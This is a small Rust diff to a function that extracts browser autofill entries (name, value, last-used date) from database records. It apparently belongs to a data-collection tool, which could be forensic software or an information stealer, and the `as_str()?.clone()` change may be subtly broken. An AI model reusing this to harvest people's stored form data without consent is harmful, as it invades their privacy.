@@ -51,8 +51,8 @@ impl<C: Collector, F: FileSystem> Task<C, F> for AutoFillTask {
 
 fn extract_autofill_from_record(record: &dyn TableRecord) -> Option<AutoFill> {
     let last_used = record.get_value(AUTOFILL_DATE_LAST_USED)?.as_integer()?;
-    let name = record.get_value(AUTOFILL_NAME)?.as_string()?.clone();
-    let value = record.get_value(AUTOFILL_VALUE)?.as_string()?.clone();
+    let name = record.get_value(AUTOFILL_NAME)?.as_str()?.clone();
+    let value = record.get_value(AUTOFILL_VALUE)?.as_str()?.clone();
 
     Some(AutoFill {
         name,
